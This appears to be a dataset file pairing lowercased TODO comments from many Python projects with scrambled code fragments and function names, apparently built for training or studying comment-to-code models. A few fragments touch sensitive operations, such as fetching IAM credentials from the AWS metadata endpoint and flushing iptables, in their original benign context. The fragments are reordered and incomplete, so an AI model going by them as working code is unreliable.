# todo(hub-cap): turn this into middleware </s> context = context.reddwarfcontext(	show def show(self, req, tenant_id, id): auth_tok=req.headers["X-Auth-Token"], tenant=tenant_id)
# todo: only standard themes supported right now </s> user_js.write('user_pref(\"devtools.theme\", \"light\");' + '\n')	write_new_settings else:
# todo: add some kind of 'failed to open' notification </s> pass	open_cb os_open(path) else:
# steps = 0 # todo </s> print("dupli export took %.3fs" % (time() - start))	convert transformations = array("f", duplis.matrices) luxcore_scene.DuplicateObject(src_name, dst_name, count, transformations)
# todo: append to current tree </s> pass	add_from_string self.objects = {} else:
# todo: direct use of json['error'] is deprecated; use display_message('...', 'error') instead. </s> j_dic['error'] = 'unable to parse the following line(s):<br/>{}'.format(	enrich_json_with_data ) if ann_obj.failed_lines: '\n<br/>\n'.join( ['{}: {}'.format(
# todo: multithread optimization, one thread per ps communication. </s> for index, g in enumerate(partition_result):	push def push(self, sub_step=0, grads=None): partition_result = self._partition_func(grads, self._ps_size) self._clients[index].push(self._base_step[index], sub_step, g)
# todo(kevinbenton): bulk? </s> deleter = getattr(request.plugin, 'delete_%s' % request.resource_type)	delete @when(index, method='DELETE') def delete(self): return deleter(request.context, self.item)
# todo: accept these via quirks? </s> desired_address = os.environ.get('libusb_address')	__init__ kwargs['bus'] = int(desired_bus) kwargs['port_number'] = int(desired_port) if desired_address: kwargs['address'] = int(desired_address)
# todo: optimize db call </s> dataset_instance = dataset_collection.collection.dataset_instances[ 0 ]	__summarize_dataset_collection else: dataset_collection = content if not self.__check_state( dataset_instance ): return
# xxx todo: real error handling, as this is probably going to </s> log.error("failed to copy driver disk files: %s", e.strerror)	copy_driver_disk_files except IOError as e:
# todo: ... </s> dumpdata(get_dump_path('blog.txt'), data)	dump_channel def dump_channel(data):
).consume()  # todo see issue 170 </s> for instance in reservation["instances"]:	load_ec2_instances Region=region, aws_update_tag=aws_update_tag, instanceid = instance["InstanceId"] monitoring_state = instance.get("Monitoring", {}).get("State", "")
# todo: empty env? </s> sendrc=false, timeout=120, usepty=false, environ={},	test_simple Obfuscated('hushnow', 'XXXXXXXX'), 'client', '-i'], self.basedir, initialStdin=client_spec) + 0,
return none # todo: probably need a universal failure code </s> return bv.start	get_imagebase bv = _binja_get_bv() if not bv:
# todo: test pdb files with dna and rna too: </s> record.annotations["molecule_type"] = "protein"	AtomIterator record_id = "%s:%s" % (pdb_id, chn_id) record = SeqRecord(Seq("".join(res_out)), id=record_id, description=record_id) record.annotations["model"] = model.id record.annotations["chain"] = chain.id
# wait until the chunks have added, todo change this to a qtbot.waitsignal </s> qtbot.wait(short_loading_delay)	test_tiled_screenshot visual = viewer.window.qt_viewer.layer_to_visual[layer] assert isinstance(visual, VispyTiledImageLayer) screenshot = viewer.screenshot(canvas_only=True) center_coord = np.round(np.array(screenshot.shape[:2]) / 2).astype(np.int)
# todo: change nonce </s> self._auth = rfc2617.authentication(	handle_REGISTER header_auth = msg.headers.get(b"authorization", None) if header_auth == None or self._auth == None: method = "digest", algorithm = "md5",
selection = page # todo api selection objects </s> if isinstance(template, basestring):	cmd_export else: page = self.notebook.get_page(page) from zim.templates import get_template template = get_template(format, template)
# todo (shea): extract method(s) to get_source_processor() </s> if "sparkle_feed" in facts:	generate_download_recipe recipe.set_description("Downloads the latest version of %s." % facts["app_name"]) keys["Input"]["SPARKLE_FEED_URL"] = facts["sparkle_feed"] sparkle_processor = processor.SparkleUpdateInfoProvider(
raise exceptions.mpdnotimplemented  # todo </s> underscore, dash, dot and colon.	subscribe already. The name may consist of alphanumeric ASCII characters plus
# todo: check the data! </s> self.asserttrue(len(list(pipe)) > 0)	test_european_performance_cars pipe_def = self._get_pipe_def(pipe_file) pipe = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def)
# @todo: deployment_setting </s> multiple = false,	prep label = T("Organization"), fields = ["organisation_id"], ), "person_id",
# todo(lbragstad): currently, fernet tokens don't support bind in the </s> if token_ref.get('bind'):	issue_v2_token :param catalog_ref: reference describing the token's catalog :returns: tuple containing the ID of the token and the token data raise exception.NotImplemented() user_id = token_ref['user']['id']
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> instancediscoveryrequest = util.setup_expected_instance_discovery_request(	test_success_dynamic_instance_discovery @httpretty.activate def test_success_dynamic_instance_discovery(self): 200, cp['authorityHosts']['global'],
# todo: replicate complete behaviour of urllib.urlopener.open </s> def open( self, fullurl, data = none ):	open tuf_updater = TUFUpdater.make_tuf_updater( fullurl ) if tuf_updater is None:
return runtime.strarray(strs)  # todo: reuse this object too? </s> if name == 'lineno':	GetVar _, line_num = self.arena.GetDebugInfo(span.line_id) strs.append(str(line_num)) return self.line_num if name == 'SOURCE_NAME':
# todo: aggregate serializable errors into errors dict </s> pass	mutate field.fset(mutable, value) except AttributeError:
# todo; to remove after full rollout of https://github.com/dimagi/commcare-hq/pull/21329/ </s> assert pillow_id == 'userpillow', 'pillow id is not allowed to change'	get_user_pillow def get_user_pillow(pillow_id='UserEPillow', num_processes=1, process_num=0, **kwargs): checkpoint = get_checkpoint_for_elasticsearch_pillow(pillow_id, USER_INDEX_INFO, topics.USER_TOPICS) user_processor = ElasticProcessor(
#todo: make the comparaison without transfert. </s> return tensor.tensortype.values_eq_approx(numpy.asarray(a), numpy.asarray(b))	values_eq_approx @staticmethod def values_eq_approx(a, b):
if lang is none:  # todo: remove in v8 </s> utils.logger.warn("renderauthors.slugify_author_name() called without language!")	slugify_author_name def slugify_author_name(self, name, lang=None): lang = '' if self.site.config['SLUG_AUTHOR_PATH']:
async_pub['jid'],  # todo: fix </s> false,  # don't daemonize	wrapper user, async_pub['tag'],  # TODO: fix
# todo: implement proper mutexes instead of these stubs </s> sync._owner = nto_sync_mutex_free	ql_syscall_sync_mutex_unlock sync = _sync(ql, syncp).loadFromMem() ql.log.debug(f'ql_syscall_sync_mutex_unlock: count={ux32s(sync._count)}, owner={ux32s(sync._owner)}') sync.updateToMem() return EOK
# todo: dont hardcode </s> return ["/users/az/programmierung/torch/install/include"]	c_header_dirs def c_header_dirs(self):
#todo: make more general (if possible) </s> solar_date = self.solar_date(record_dict)	solar_year Function which takes a record_dict containing all values from a query in the get_db_slices function and returns the solar year of the observation return solar_date.year
# todo: i don't think these should be pushed back on. </s> self.push(l)	byte_DELETE_SUBSCR l = self.pop() del l[ind] self.push(ind)
# todo: does this whole section disappear with proper headers from requesthandler? </s> other_uri = environ['script_name'] + e.path_info	cgiHandler status_code, headers, content = requestHandler(config, path_info, query_string) except Core.TheTileIsInAnotherCastle, e: if query_string: other_uri += '?' + query_string
# todo: remove patch and update test once calculation_magic is implemented </s> @mock.patch("sentry.tasks.low_priority_symbolication.calculation_magic", lambda x, y: true)	test_has_metric_not_in_lpq @freeze_time(datetime.fromtimestamp(0)) def test_has_metric_not_in_lpq(self, store) -> None: store.increment_project_event_counter(17, 0)
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
for people in annos:  # todo : speed up with affine transform </s> new_keypoints = []	keypoint_resize_random_crop mask = mask[crop_range_y:crop_range_y + _target_height, :] new_joints = [] for keypoints in people: if keypoints[1] >= crop_range_y and keypoints[1] <= crop_range_y + _target_height - 1:
# todo(b/141131288): enable test once complex sort is supported on tpu. </s> if (jnp.issubdtype(dtype, jnp.complexfloating)	testMsort for shape in nonzerodim_shapes)) def testMsort(self, dtype, shape): and jtu.device_under_test() == "tpu"): self.skipTest("complex sort not supported on TPU")
# todo: different codec to be used </s> raise (	__to_coer_buf Cont = self._get_val_obj(self._val[0]) if Cont == self._const_cont and self._const_cont_enc is not None: ASN1NotSuppErr('{0}: specific CONTAINING encoder unhandled' \ .format(self.fullname())))
@persistent # todo: not sure if i should be using @persistent </s> def load_handler_after_rend_frame(scene): # todo: not sure if this is the best place to put this	load_handler_after_rend_frame if scene.my_addon.save_gt_data: gt_dir_path = scene.render.filepath
raise notimplementederror #todo </s> elif self.action == "merge":	Action raise NotImplementedError #TODO elif self.action == "APPEND": raise NotImplementedError #TODO elif self.action == "SPLIT":
# @todo: return only packages for the current architecture </s> pkg_name = aur_pkg['name']	cli_search_packages print(result[repo].stdout) for aur_pkg in result[aur].json['results']: if args.quiet: print(pkg_name)
assert study_id == 0  # todo </s> self.trials[trial_id].params[param_name] = value	report_param def report_param(self, study_id, trial_id, param_name, value):
# todo: check for expected warnings. </s> return self._run_master(sample_0_9_0b5_api_renamed)	test_config_0_9_0b5_api_renamed def test_config_0_9_0b5_api_renamed(self):
# todo: make pull request to get this custom vgg feature accepted </s> with slim.arg_scope(vgg.vgg_arg_scope()):	FCN_16s upsample_filter_factor_16_tensor = tf.constant(upsample_filter_factor_16_np) with tf.variable_scope("fcn_16s")  as fcn_16s_scope: last_layer_logits, end_points = vgg.vgg_16(mean_centered_image_batch, num_classes=number_of_classes,
# todo: can the instance lock be downgraded here? take the optional disk </s> self.lu.logstep(cstep, steps_total, "sync devices")	_ExecDrbd8Secondary _ReleaseLocks(self.lu, locking.LEVEL_NODE_RES, keep=self.node_secondary_ip.keys()) cstep += 1 _WaitForSync(self.lu, self.instance)
annot.annotation_metadata.annotation_rules = "todo" #todo </s> annot.annotation_metadata.validation_and_reliability = "todo" #todo	fill_annotation annot.annotation_metadata.version = "1.2" annot.annotation_metadata.annotation_tools = "Sonic Visualizer" annot.annotation_metadata.origin = metadata[1] annot.annotation_metadata.annotator.name = metadata[annotation_id + 2]
# todo test </s> def apply_cut(cut, connectivity_matrix):	apply_cut set of nodes to the other are destroyed.""" cm = connectivity_matrix.copy()
# todo: does this need to be made more efficient? </s> p1 = future.futureparser()	RunCompiler elif mode == "exec": graph = pyassem.PyFlowGraph("<module>", filename) p2 = future.BadFutureParser() p1.Dispatch(as_tree)
# todo: remove this when hftransformersnlp is removed for good </s> logging.debug(	_get_docs_for_batch hf_transformers_doc = batch_examples[0].get(LANGUAGE_MODEL_DOCS[attribute]) if hf_transformers_doc: f"{LANGUAGE_MODEL_DOCS[attribute]} set: this " f"indicates you're using the deprecated component "
#[todo]: softmax is not supported yet </s> loss = svm_loss(scores, y)	TwoLayerNet if y is None: return scores loss_with_reg = loss + mp.sum(W1 ** 2) * 0.5 * self.reg + mp.sum(W2 ** 2) * 0.5 * self.reg return loss_with_reg
# todo: avoid dummy and generate func here when inlining is possible </s> def _impl(df, axis=0, level=none, numeric_only=false):	_impl return hpat.hiframes.pd_dataframe_ext.count_dummy(df)
# todo: external summary for enum values </s> value.summary = ''	extract_enum_doc value.id = state.config['ID_FORMATTER'](EntryType.ENUM_VALUE, entry.path[-1:] + [name]) value.value = int(v) out.values += [value] if not state.config['SEARCH_DISABLED']:
# todo: if this is the initial load of logging config we might not have </s> try:	load_config parser.readfp(StringIO.StringIO(extension.get_default_config())) for filename in files: filehandle = codecs.open(filename, encoding='utf-8') parser.readfp(filehandle)
# todo(b/179510447): align these parameters with schulman 17. </s> std_kernel_initializer_scale = 0.1	std_layers def std_layers(): std_bias_initializer_value = np.log(np.exp(0.35) - 1) return tf.keras.layers.Dense(
# todo: mark this error on the eq relation, not the entities </s> for e in equiv_anns:	verify_equivs if (t2,t1) in marked: continue issues.append(AnnotationIssue(e.id, AnnotationError, "Equiv relation not allowed between %s and %s" % (disp(t1), disp(t2)))) marked[(t1,t2)] = True
+ ansi.ansi_normal  # todo: why does it keep it? </s> + "foo"))	test_re_underline parser.re_underline( "a " + ansi.ANSI_UNDERLINE + "red"
# todo sensible lookup table (doesn't matter for now because small n) </s> for mode_def in get_modes():	lookup_mode def lookup_mode(mode): if mode_def.mode == mode: return mode_def
# todo: use pybossa uploader! only for debugging: </s> open('/tmp/%d_%s_task_run_json.zip' % (app.id, name), 'wb').write(memzip.getvalue())	export_json memfile.write(str(line)) memzip = make_onefile_memzip(memfile, '%s_task_run.json' % name)
from pyomo.core.kernel.component_variable import ivariable # todo </s> if isinstance(self._base, (var, ivariable)):	GetItemExpression def _is_fixed(self, values): from pyomo.core.base import Var # TODO for x in itervalues(self._base): if not x.__class__ in nonpyomo_leaf_types and not x.is_fixed():
# todo: do something more than simply selecting the last match? </s> matches = self.class_dict[self.hash_schema(schema)]	from_dict rootschema = rootschema or schema if cls is None: cls = matches[-1] if matches else self._passthrough schema = _resolve_references(schema, rootschema)
# todo: move this into the operations code for its caller </s> for a in self.atoms.values():	Passivate This transmutes real atoms to match their number of real bonds, and (whether or not that succeeds) removes all their open bonds. if p or a.picked: a.Passivate()
# todo: compute bezier curve. </s> anchors = self.get_anchors()	bbox def bbox(self, vector=False): if vector: if not anchors or len(anchors) < 2: return BBox(0, 0, 0, 0)
gre = [1, 1, 1]  # todo calculate based on mesh </s> grid_dim_offset = np.linspace(0, domain_dimension[0], num_grids + 1, dtype=np.int32)	_parse_index num_grids = min(shape[0], int(np.ceil(functools.reduce(mul, shape) * self.vpg ** -1))) gle = [-1, -1, -1]  # TODO Calculate based on mesh grid_edge_offset = grid_dim_offset * np.float(domain_dimension[0]) ** -1 * (gre[0] - gle[0]) + gle[0] mesh_names = []
# todo: unfortunately, mongoengine contains bug which </s> op, term = parse_like_term(search)	get_list query = f.apply(query, value) if self._search_supported and search: criteria = None for field in self._search_fields:
# todo: edge dps could use a different forwarding algorithm </s> host_learned_other_dp = none	rcv_packet learn_port = port else: for other_dpid, other_valve in valves.iteritems(): if other_dpid == dp_id:
# todo: assert </s> self.asserttrue(self.remote.copy_system(system, "testsystemcopy", self.token))	test_copy_system Test: copy a system object system = self.remote.get_item_handle("system", "testsystem0", self.token) assert 0
# floc-1828 todo - use archive_bucket rather than clusterhq-archive-testing  # noqa </s> run_from_args([	task_install_flocker run_from_args([ "add-apt-repository", "-y", "ppa:james-page/docker"]), 'add-apt-repository', '-y', 'deb https://clusterhq-archive-testing.s3.amazonaws.com/ubuntu/14.04/$(ARCH) /'  # noqa
# todo: all the expand stuff! </s> view.textcursor().inserttext(text)	trigger text = template.text(name) if text:
# todo: 判断返回结果，处理异常 </s> print msg	perm_role_delete task = Tasks(recycle_resource) msg = task.del_user(get_object(PermRole, id=role_id).name) key_files = os.listdir(role_key) for key_file in key_files:
# todo(twd2): do more visibility check eg. contest </s> ddocs, dpcount, _ = await pagination.paginate(	DiscussionNodeHandler if vnode['doc_type'] == document.TYPE_PROBLEM and vnode.get('hidden', False): self.check_perm(builtin.PERM_VIEW_PROBLEM_HIDDEN) discussion.get_multi(self.domain_id, parent_doc_type=vnode['doc_type'],
# todo: finish this </s> return none	get_relative_template_location if view.template_path is not None: return os.path.split(view.template_path)
# todo save the error to the plugin </s> plugin_db_setting.save()	_init_plugins if not settings.PLUGIN_TESTING: plugin_db_setting.active = False settings.INTEGRATION_PLUGINS_INACTIVE[plug_key] = plugin_db_setting continue  # continue -> the plugin is not loaded
# todo also test these! </s> continue	test_classifiers continue if Clf in [MultinomialNB, BernoulliNB]: clf = Clf() clf.fit(X, y)
# todo(b/158741360): add type annotations once pytype checks across modules. </s> def get_task_cls(task_config_cls):	get_task_cls task_cls = registry.lookup(_REGISTERED_TASK_CLS, task_config_cls) return task_cls
irregular_dim_names = ['time', 't']  # todo: use irregular flag from database instead </s> result['irregular_dims'] = dict((dim, example[dim].values)	get_result_stats 'result_max': tuple(to_single_value(example[dim].max()) for dim in example.dims), } for dim in example.dims if dim in irregular_dim_names) return result
## todo: # fixme: remove me </s> if not paste_childrens:	get_all_pastes_domain paste_parent = father.replace(self.paste_directory, '')[1:] paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(paste_parent)) paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(father)) for children in paste_childrens:
# todo: determine proper template to use. </s> app_name + "." + recipe_format + ".recipe"] = "template tbd"	handle_sccm_recipe_input if app_name + "." + recipe_format + ".recipe" not in __existing_recipes__: __buildable_recipes__[
# todo: make an ascii-art bar </s> return "%.1f%%" % (100.0 * progress)	render_progress_ciphertext def render_progress_ciphertext(self, ctx, data): progress = data.get_progress()[1]
# todo: check num strings and support nan </s> data_start = getitem_c_arr(	_str_get_impl for i in numba.parfor.internal_prange(n): start_index = getitem_c_arr(arr._index_offsets, i) arr._data_offsets, start_index + ind) data_start += 1
time.sleep(40)  # todo: should remove after polling get. </s> mpc_1_2_3 = op(mpc_1_2, mpc_2_3)	test_tensor_abstraction_subsets time.sleep(40)  # TODO: should remove after polling get. mpc_2_3 = op(tensor_pointer_2, tensor_pointer_3) time.sleep(40)  # TODO: should remove after polling get. exp_res_1 = op(data_1, data_2)
pass # todo </s> def test_update(self):	test_update
# todo: remove temporary workaround once https://github.com/python-babel/babel/issues/415 has been resolved. </s> babel_415_workaround = description['title']	load self.ui.update_level.clear() for level, description in PROGRAM_UPDATE_LEVELS.items(): self.ui.update_level.addItem(_(babel_415_workaround), level) self.ui.update_level.setCurrentIndex(self.ui.update_level.findData(config.setting["update_level"]))
# todo: get a better way for this. the 'downloadsize' key in logicpro_plist </s> if os.path.getsize(save_path) < download_size:	main download_size_string = human_readable_size(download_size) if os.path.exists(save_path): print "Remote file is larger. Downloading %s from %s" % (download_size_string, download_url) download_package_as(download_url, save_path)
# todo: remove compatability hooks </s> lockfile = os.path.join(target,esky_control_dir,"lockfile.txt")	uninstall_version target = os.path.join(self.appdir,target_name) assert os.path.dirname(target) == self.appdir if not os.path.exists(lockfile): lockfile = os.path.join(target,"esky-lockfile.txt")
pass  # todo </s> else:	_help pass  # TODO
# todo: test bytearray </s> if not isinstance(prefix, (bytes, bytearray)):	Key versionbyte = self.network.prefix_wif else: versionbyte = binascii.unhexlify(prefix) else:
# todo: improve the unicode checking </s> try:	smart_quote def smart_quote(val): safe_key = urllib.quote(val, safe="") except (KeyError, UnicodeEncodeError, UnicodeError):
#todo classes broken </s> sample = self.sess.run(generator, feed_dict={})	sample_batch y_t = get_tensor("y") print("generator is ", generator) print("sample is ", sample) print(sample.shape)
# this is the dc dmdsec. @todo: account for other as well. </s> dmdsec = dmdsecs[0]	generateSimpleContentDMDirectUploadPackage outputDipDir = prepareOutputDir(outputDipDir, 'directupload', dipUuid) if len(dmdSecs): else: dmdSec = dmdSecs
# todo: fix output type </s> s = 0	_column_sum_impl_basic def _column_sum_impl_basic(A):  # pragma: no cover numba.parfor.init_prange() for i in numba.parfor.internal_prange(len(A)): val = A[i]
# todo: read back actual frequency and store </s> self.tune_hook()	_update_frequency def _update_frequency(self): self.osmosdr_source_block.set_center_freq(self._compute_frequency(self.freq), 0)
# todo(cvan): uncomment when bug 719512 gets fixed. </s> eq_(r.status_code, 200)	TestPrivacy r = self.client.get(self.url)
# todo is this check necessary; this was an assertion which are disabled in <4000 which is good </s> if not isinstance(values, list):	_set if not _is_writable_register(name): return None  # Vim fails silently. raise ValueError('Register values must be inside a list') values = [str(v) for v in values]
# todo presto drops the union and decimal fields </s> self.assertequal(cursor.description, [	test_complex def test_complex(self, cursor): cursor.execute('SELECT * FROM one_row_complex') ('boolean', 'BOOLEAN_TYPE', None, None, None, None, True), ('tinyint', 'TINYINT_TYPE', None, None, None, None, True),
# todo: finish this. </s> pass	rename def rename(self, old, new):
# todo: may test file contents </s> temp = tempfile.namedtemporaryfile(delete=false)	test_export_to_csv_filename def test_export_to_csv_filename(self): self.files_to_delete.append(temp.name) rows.export_to_csv(utils.table, temp.name)
# todo: wrap this with a try and handle exceptions gracefully </s> result = requests.get(	creds result.raise_for_status() role = result.text "http://169.254.169.254/latest/meta-data/iam/security-credentials/{0}".format(role) )
# todo: impala attempt to speed up final pass after lstm. </s> merged_impala_hack = self.call(self.merger.merge, state_values, logits, probs, log_probs)	get_state_values_logits_parameters_log_probs nn_output_folded = self.call(self.time_rank_folder.apply, nn_output) state_values, logits, probs, log_probs = self.call(self.action_adapter.get_state_values_logits_parameters_log_probs, nn_output_folded) unfolded = self.call(self.time_rank_unfolder.apply, merged_impala_hack) state_values_unfolded, logits_unfolded, probs_unfolded, log_probs_unfolded = self.call(self.splitter.split, unfolded)
# todo: choose one from the following two </s> config.add_no_good_cuts = true	solve config.add_slack = False if config.strategy == "GOA": config.use_tabu_list = False config.add_slack = False
# todo: sync with server </s> self.days = timedelta(days=days)	Defcon await ctx.send("DEFCON disabled.") else: await ctx.send(f"DEFCON enabled; accounts must be {days} days old to join to the server")
# todo: use `summary`, `severity` and `description` </s> raise graphqlerror(	handle_graphql_errors if errors: error = errors[0]  # TODO: Handle multiple errors "GraphQL error: {} / {!r}".format( error.get("message"), error.get("debug_info")
# todo: can be done faster by custom code </s> return self.islastlineofelem(line) and self.isfirstlineofelem(line)	isOnlyLineOfElem def isOnlyLineOfElem(self, line):
#todo remove str() -- http://github.com/fifengine/fifengine/issues/701 </s> self.play_ambient(str(soundfile), loop_interval=play_every,	_init_playing random.randint( * self.__class__.AMBIENT_SOUND_INTERVAL_VARIANCE ) for soundfile in self.soundfiles: position=self.instance.position.center)
def _get_response(self):  # todo: add timeout </s> return json.load(str_data)	_data_transfer str_data = urlopen(self.url, timeout=self.timeout)
# todo:  needs to be moved into rasterdata level api </s> options['transform'] = data.reader.dataset.profile['transform']	ingest options['raster_x_size'] = data.reader.width options['raster_y_size'] = data.reader.height options['dtype'] = data.reader.dataset.profile['dtype'] if 'vrt_path' in kwargs:
# todo(john sirois): map target.resources in the same way </s> for target in versioned_target_set.targets:	execute_single_compilation genmap.add(source, output_dir, classes) genmap.add(target, output_dir, classes) if is_scalac_plugin(target) and target.classname: basedir = self.write_plugin_info(target)
# todo check the error message here. </s> assert response.status_code == 400	test_relationship_single_wrong_format query_string=query_string)
# todo: not sure if this is pg only or standard </s> "alter table t alter column c drop not null"	test_alter_column_nullable op.alter_column("t", "c", nullable=True) context.assert_(
# todo: set the following parameter </s> config[setting_name('social_auth_disconnect_pipeline')] = (	_parse_config ) config[setting_name('DISCONNECT_REDIRECT_URL')] = ()
# todo add shape check </s> raise notimplementederror	_jac_t_mat_prod def _jac_t_mat_prod(self, module, g_inp, g_out, mat):
# todo: support data with shape </s> feed_dict = {}	Predict return response request_example = json.loads(request.data) for key in self.inputs.keys(): feed_dict[self.inputs[key]] = request_example[key]
# todo: only if successful </s> self.is_migrating = false # this should really be true until evaluate_submission tasks are all the way completed	apply_phase_migration current_phase.is_migrated = True current_phase.save() self.is_migrating_delayed = False self.last_phase_migration = current_phase.phasenumber
pattern = '[aeiou]{2}' # todo: change this to '/[aeiou]{2}/' </s> expected = ('.clear()', '.count()') if py3 else ('.count()',)	test_filter_ignore_case_with_regex_string def test_filter_ignore_case_with_regex_string(self): obj = [] filtered_result = see(obj).filter_ignore_case(pattern) self.assertIsInstance(filtered_result, output.SeeResult)
# todo: remove when #980 has been merged </s> info['url'] = formats[-1]['url']	_real_extract 'upload_date': upload_date, } info['ext'] = determine_ext(formats[-1]['url']) return self.video_result(info)
# truffle todo: revert </s> for __x in _glob2(dirname, basename, dironly): yield __x	_iglob if not dirname: if recursive and _isrecursive(basename): else: for __x in _glob1(dirname, basename, dironly): yield __x
# todo: handle this error </s> except attributeerror:	notify try: subscribed_users = getattr(subscription, notification_type) pass send(subscribed_users, notification_type, **context)
# todo: use separate index type instead of just storing array </s> return lambda s: s._data	get_series_data def get_series_data(S):
# todo: if `sqlalchemy` interface, delete key in engines </s> except exception as e:	delete_connector try: Connector.objects.get(id=connector['id']).delete() raise PopupException(_('Error deleting connector %s: %s') % (connector['name'], e)) update_app_permissions()
# todo - need to parameterize this into generate_match_filters, </s> exact_match_filter = "(&(objectclass=person)%s)" % exact_match_filter	find_users (exact_match_filter, partial_match_filter) = self.__generate_match_filters( search_fields, criteria_words) partial_match_filter = "(&(objectClass=person)%s)" % partial_match_filter conn = self.getConnection(opts)
# todo: is this safe? </s> self.cmd( 'iptables -f' )	config self.localIntf =  self.defaultIntf() self.cmd( 'sysctl net.ipv4.ip_forward=0' ) self.cmd( 'iptables -t nat -F' ) self.cmd( 'iptables -P INPUT ACCEPT' )
# todo check for collision with user filter </s> user_inner = cutoff_freq - transition_width / 2	__stage_taps firdes.WIN_HAMMING) else: limit = stage_output_rate / 2 return firdes.low_pass(
# todo use trads with %s </s> cls.echo(msg['reason'])	call else: for msg in err.dry_run: cls.echo('\t' + ' '.join(msg['attr'])) sys.exit(1)
# todo does a real upgrade (instead of uninstall/install) work? </s> return run_from_args([	_uninstall_flocker_ubuntu1404 def _uninstall_flocker_ubuntu1404(): b"apt-get", b"remove", b"-y", b"--purge", b"clusterhq-python-flocker",
#todo generate the labels for the dict automatically from labels </s> data = {'time': time_array, 'data': countrate, 'labels': labels}	parse_obssumm_hdulist dim = np.array(countrate[:,0]).size time_array = [reference_time_ut + timedelta(0,time_interval_sec * a) for a in np.arange(dim)] return header, data
# todo make this faster either in c++ or python </s> blender_pass.rect = [[buffer[i], buffer[i + 1], buffer[i + 2]] for i in range(0, len(buffer), 3)]	_refresh_denoiser buffer = self.aov_buffers[output_name] blender_pass = render_layer.passes[output_name]
# todo: when repo.subscribe(observer) </s> pass	test_in_memory_hyperparams_repository_should_be_observable repo: InMemoryHyperparamsRepository = InMemoryHyperparamsRepository()
# todo: test dropping "collision_lines_map" and replacing with "enter/exit" tiles </s> if not getattr(tiled_object, "closed", true):	collision_lines_from_object def collision_lines_from_object(self, tiled_object, tile_size): for item in self.process_line(tiled_object, tile_size): blocker0, blocker1, orientation = item
# todo: configurable rsync options? </s> output = run_command("rsync -avtz --delete %s/ %s" %	YumRepoMockReleaser debug(output) print("Syncing yum repository back to: %s" % rsync_location) (yum_temp_dir, rsync_location)) debug(output)
# todo: and results </s> success = yield asynclist(tasks)	auto_add if dev.is_partition and dev.partition_slave == device: tasks.append(self.auto_add(dev, recursive=True)) yield Return(success)
# todo: give a vanilla example </s> .. math::	feca def feca(predicted_power, df_appliances_ground_truth): fraction = \\sum_n min \\left (
#execute 'autodone' on the current command </s> previous_command = self.commandsequencer.prevmode	Done print_compact_traceback("bug, ignoring: ") #bruce 071011 added this else: if previous_command is not new_mode: self._exit_previous_command(exit_using_done_or_cancel_button)
# todo: call 'status_callback'? </s> cluster._jobs.append(_job)	reschedule_jobs logger.debug('Rescheduling job %s from %s', _job.uid, _job.node.ip_addr) _job.job.status = DispyJob.Created else: logger.debug('Job %s scheduled on %s abandoned', _job.uid, _job.node.ip_addr)
# todo: this is a jump. </s> vi_cmd_data['motion']['command'] = '_vi_forward_slash'	vi_forward_slash def vi_forward_slash(vi_cmd_data): vi_cmd_data['motion']['args'] = {'mode': vi_cmd_data['mode'], 'count': vi_cmd_data['count'], 'search_string': vi_cmd_data['user_motion_input']} vi_cmd_data['count'] = 1
# todo(mottodora): add reduce option </s> if self.ignore_nan:	forward_cpu x0, x1 = inputs diff = (inputs[0] - inputs[1]).ravel() diff[numpy.isnan(diff)] = 0. return numpy.array(abs(diff).sum() / diff.size, dtype=diff.dtype),
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmd), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors="ignore") output = output.replace('\r', '')
# todo(evonide) define field </s> self.reviewer = reviewer	accept_review def accept_review(self, reviewer): self.update_state(VulnerabilityState.IN_REVIEW)
reorder_attributes(element)  # todo: remove when support is python 3.8+ </s> et.elementtree(element).write(fh, encoding='unicode')	export_to_xml element.tail = element.tail.strip(' ') fh.write('  ') for material in sorted(self, key=lambda x: x.id): element = material.to_xml_element(self.cross_sections)
if not version_2_79_or_older():  # todo </s> col = box.column(align=true)	draw box = layout.box() col = box.column(align=True) row = col.row(align=True) row.scale_y = 0.75
# todo: do something more than simply selecting the last match? </s> hash_ = self.hash_schema(schema)	_get_constructor def _get_constructor(self, schema): matches = self.class_dict[hash_] return matches[-1] if matches else self._passthrough
# todo: deprecation warning </s> class defaultserializer(self.model_serializer_class):	DefaultSerializer class Meta: model = self.model
# todo(brett.cannon) implement </s> pass	test_implicit_hooks def test_implicit_hooks(self):
# todo(mhickey): get rid of it once we switch the db model to using </s> return result	modify_fields_to_db result['mac_address'] = str(result['mac_address'])
# todo(b/34288791): this needs to be exactly the same as in impl.py </s> copied_inputs = impl_helper.copy_tensors(input_signature)	get_analysis_dataset_keys input_signature = impl_helper.feature_spec_as_batched_placeholders( feature_spec) output_signature = preprocessing_fn(copied_inputs) transform_fn_future, _ = build(
## todo : log error </s> error_code = delete_all_functions_foraction_doctype(doctype=doctype, action=action)	_delete_submission_from_doctype user_msg.append("""When deleting Submission "%s" from Document Type "%s", it wasn't possible to delete all Function Parameters""" \ % (action, doctype)) if error_code != 0: user_msg.append("""When deleting Submission "%s" from Document Type "%s", it wasn't possible to delete all Functions""" \
# todo: remove this after we create the contents web service and directories are </s> def notebooks_only(nb_list):	notebooks_only return [nb for nb in nb_list if 'type' not in nb]
@unittest.skipif(not settings.dev_mode, 'dev_mode disabled, osf.users.create unavailable')  # todo: remove when available outside of dev_mode </s> def test_properly_scoped_token_can_create_and_send_email(self, mock_auth, mock_mail):	test_properly_scoped_token_can_create_and_send_email @mock.patch('framework.auth.views.mails.send_mail') @mock.patch('api.base.authentication.drf.OSFCASAuthentication.authenticate') token = ApiOAuth2PersonalToken( owner=self.user,
# todo: i am relying on order preservation here... </s> assert top.indices == bottom.indices, (	compile_expression ) for top, bottom in zip(top_sks, bottom_sks): "Top and bottom kernels must have the same indices" )
# todo: this should be solved via plugins </s> alter_foreignkey_to_int('recipes_oldrecipearticleredirect', 'new_id')	alter_self_foreignkeys alter_foreignkey_to_int('articles_articlecontents', 'article') if 'recepty.recipes' in settings.INSTALLED_APPS:
